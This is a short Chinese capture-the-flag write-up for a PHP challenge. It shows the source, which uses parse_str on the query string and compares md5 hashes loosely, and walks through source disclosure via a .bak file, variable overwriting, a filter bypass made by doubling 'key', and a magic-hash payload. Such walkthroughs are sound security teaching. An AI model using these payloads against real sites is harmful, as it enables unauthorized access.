题目提示备份，访问index.php.bak获取到index.php的源码

```javascript
<?php
include_once "flag.php";
ini_set("display_errors", 0);
//截取url后面的东西
$str = strstr($_SERVER['REQUEST_URI'], '?');
//返回str除第一个字符以外的字符
$str = substr($str,1);
//str中的key 替换为
$str = str_replace('key','',$str);
parse_str($str);
echo md5($key1);

echo md5($key2);
if(md5($key1) == md5($key2) && $key1 !== $key2){
    echo $flag."取得flag";
}
?>
```



1. key1和key2的值从flag.php中获取，想要输出flag。必须得让md5($key1) == md5($key2) && $key1 !== $key2。这里可以利用==弱类型绕过。



2.key1=QNKCDZO&key2=240610708

但是现在的问题，是如何让flag.php文件中的key值由我们控制。

payload:flag.php?key1=QNKCDZO&key2=240610708不行......想想也对，只有index.php有输出



3.此时考虑变量覆盖

```javascript
$str = strstr($_SERVER['REQUEST_URI'], '?');
//返回str除第一个字符以外的字符
$str = substr($str,1);
//str中的key 替换为
```

这段代码获取url中？之后的内容



4.绕过过滤

```javascript
$str = str_replace('key','',$str);
```

这段代码将url中的key替换为空。这是可以考虑重写绕过kekeyy



5.导致变量覆盖的代码

```javascript
parse_str($str);
```



![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/bugku/images/02549563800848639345352FBEB69AF0clipboard.png)



6.payload:

?kekeyy1=240610708&kekeyy2=QNKCDZO